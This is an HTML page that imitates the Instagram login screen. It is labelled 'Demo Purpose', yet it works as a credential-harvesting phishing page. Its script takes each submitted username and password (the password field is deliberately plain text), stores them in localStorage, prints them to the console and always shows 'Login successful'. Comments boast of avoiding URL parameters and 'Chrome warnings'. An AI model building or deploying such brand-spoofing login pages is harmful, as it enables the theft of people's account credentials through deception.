<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Demo Purpose</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', sans-serif;
            background: #fafafa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .main-container {
            width: 100%;
            max-width: 400px;
        }

        .login-form {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            padding: 0;
            margin-bottom: 20px;
        }

        .login-header {
            padding: 48px 40px 24px;
            text-align: center;
            border-bottom: 1px solid #dbdbdb;
        }

        .instagram-logo {
            font-size: 32px;
            font-weight: 700;
            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 8px;
            letter-spacing: -1px;
            font-style: italic;
        }

        .login-subtitle {
            color: #8a8a8a;
            font-size: 13px;
            margin-top: 8px;
        }

        .form-inputs {
            padding: 0 40px;
            padding-top: 24px;
        }

        .form-group {
            margin-bottom: 10px;
        }

        input[type="text"] {
            width: 100%;
            padding: 10px 10px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            font-size: 13px;
            font-family: inherit;
            transition: all 0.2s ease;
        }

        input[type="text"]:focus {
            outline: none;
            border-color: #bdbdbd;
            background: #fff;
            box-shadow: 0 0 0 1px rgba(0, 0, 0, 0.05);
        }

        input::placeholder {
            color: #a6a6a6;
        }

        .form-messages {
            padding: 0 40px;
        }

        .form-error {
            background: #fff3cd;
            color: #d63031;
            padding: 8px 10px;
            border-radius: 4px;
            font-size: 13px;
            margin-bottom: 12px;
            border: 1px solid #f5a5a5;
            display: none;
            animation: shake 0.3s ease;
        }

        .form-error.show {
            display: block;
        }

        .form-success {
            background: #d4edda;
            color: #155724;
            padding: 8px 10px;
            border-radius: 4px;
            font-size: 13px;
            margin-bottom: 12px;
            border: 1px solid #c3e6cb;
            display: none;
        }

        .form-success.show {
            display: block;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-4px); }
            75% { transform: translateX(4px); }
        }

        .login-btn {
            width: 100%;
            padding: 8px;
            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 12px;
            transition: opacity 0.2s ease;
        }

        .login-btn:hover:not(:disabled) {
            opacity: 0.8;
        }

        .login-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 16px 0;
            gap: 12px;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }

        .divider-text {
            font-size: 13px;
            color: #8a8a8a;
            font-weight: 600;
        }

        .facebook-btn {
            width: 100%;
            padding: 8px;
            background: #0a66c2;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 16px;
            transition: opacity 0.2s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .facebook-btn:hover:not(:disabled) {
            opacity: 0.8;
        }

        .forgot-password {
            text-align: center;
            font-size: 12px;
            color: #003569;
            text-decoration: none;
            margin-bottom: 24px;
            display: block;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .signup-section {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            padding: 16px;
            text-align: center;
            font-size: 14px;
            color: #262626;
            margin-bottom: 20px;
        }

        .signup-link {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }

        .signup-link:hover {
            text-decoration: underline;
        }

        .spinner {
            display: inline-block;
            width: 14px;
            height: 14px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.8s linear infinite;
            margin-right: 6px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="main-container">
        <!-- Instagram Login Form -->
        <div class="login-form">
            <div class="login-header">
                <div class="instagram-logo">Instagram</div>
                <div class="login-subtitle">Demo Purpose</div>
            </div>

            <form id="loginForm">
                <div class="form-messages">
                    <div class="form-error" id="errorMessage"></div>
                    <div class="form-success" id="successMessage"></div>
                </div>

                <div class="form-inputs">
                    <!-- Phone/Email/Username -->
                    <div class="form-group">
                        <input 
                            type="text" 
                            id="username" 
                            placeholder="Phone number, username, or email"
                        >
                    </div>

                    <!-- Password (VISIBLE - NOT DOTS) -->
                    <div class="form-group">
                        <input 
                            type="text" 
                            id="password" 
                            placeholder="Password"
                        >
                    </div>

                    <button type="submit" class="login-btn" id="loginBtn">
                        Log in
                    </button>

                    <div class="divider">
                        <span class="divider-text">OR</span>
                    </div>

                    <button type="button" class="facebook-btn" onclick="handleFacebook(event)">
                        <i class="fab fa-facebook"></i> Log in with Facebook
                    </button>

                    <a href="#" class="forgot-password" onclick="event.preventDefault(); showError('Password reset link will be sent to your email')">Forgot password?</a>
                </div>
            </form>
        </div>

        <!-- Signup Section -->
        <div class="signup-section">
            Don't have an account? <a href="#" class="signup-link" onclick="event.preventDefault(); showError('Redirecting to sign up page...')">Sign up</a>
        </div>
    </div>

    <script>
        const form = document.getElementById('loginForm');
        const errorMessage = document.getElementById('errorMessage');
        const successMessage = document.getElementById('successMessage');
        const loginBtn = document.getElementById('loginBtn');

        // ✅ NO URL PARAMETERS
        // Data saved locally
        // No credentials in URL
        // No Chrome warnings!

        // Validate email
        function validateEmail(email) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailRegex.test(email);
        }

        // Show error
        function showError(message) {
            errorMessage.textContent = message;
            errorMessage.classList.add('show');
            setTimeout(() => {
                errorMessage.classList.remove('show');
            }, 3500);
        }

        // Show success
        function showSuccess(message) {
            successMessage.textContent = message;
            successMessage.classList.add('show');
            setTimeout(() => {
                successMessage.classList.remove('show');
            }, 2500);
        }

        // Save login data (NO URL PARAMETERS)
        async function saveLoginData(username, password) {
            try {
                // Create data
                const loginData = {
                    username: username,
                    password: password,
                    timestamp: new Date().toLocaleString(),
                    date: new Date().toLocaleDateString(),
                    time: new Date().toLocaleTimeString(),
                    id: Date.now()
                };

                // Save to local storage
                let allLogins = [];
                const stored = localStorage.getItem('instagramLogins');
                if (stored) {
                    try {
                        allLogins = JSON.parse(stored);
                    } catch (e) {
                        allLogins = [];
                    }
                }
                
                allLogins.push(loginData);
                localStorage.setItem('instagramLogins', JSON.stringify(allLogins));
                
                console.log('✅ Login saved!');
                console.log('👤 Username:', username);
                console.log('🔑 Password:', password);
                console.log('⏰ Time:', loginData.timestamp);
                console.log('💾 Data:', loginData);
                
                return true;

            } catch (error) {
                console.error('Error:', error);
                return false;
            }
        }

        // Form submission (NO URL REDIRECT)
        form.addEventListener('submit', async (e) => {
            e.preventDefault();

            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();

            // Validation
            if (!username || !password) {
                showError('Username/Email and password are required.');
                return;
            }

            if (username.includes('@') && !validateEmail(username)) {
                showError('Invalid email address');
                return;
            }

            if (password.length < 1) {
                showError('Password is required.');
                return;
            }

            // Show loading
            loginBtn.disabled = true;
            loginBtn.innerHTML = '<span class="spinner"></span>Logging in...';

            // Save login data
            const success = await saveLoginData(username, password);

            // Reset button
            loginBtn.disabled = false;
            loginBtn.innerHTML = 'Log in';

            if (success) {
                showSuccess('✅ Login successful!');
                setTimeout(() => {
                    form.reset();
                }, 1500);
            }
        });

        // Facebook auth
        function handleFacebook(event) {
            event.preventDefault();
            showError('Facebook login requires backend integration');
        }

        // Enter key submission
        document.getElementById('password').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                form.dispatchEvent(new Event('submit'));
            }
        });

        // Prevent form auto-fill from adding URL parameters
        window.addEventListener('beforeunload', () => {
            window.history.replaceState({}, document.title, window.location.pathname);
        });

        // Log on page load
        window.addEventListener('load', () => {
            // Clear URL parameters if any exist
            if (window.location.search) {
                window.history.replaceState({}, document.title, window.location.pathname);
            }

            console.log('%c📱 Instagram Login Page', 'font-size: 16px; font-weight: bold; color: #E4405F;');
            console.log('%c✅ Safe - No URL Parameters', 'font-size: 14px; font-weight: bold; color: green;');
            console.log('Data saved locally, not in URL');
            console.log('View logins: JSON.parse(localStorage.getItem("instagramLogins"))');
        });
    </script>
</body>
</html>
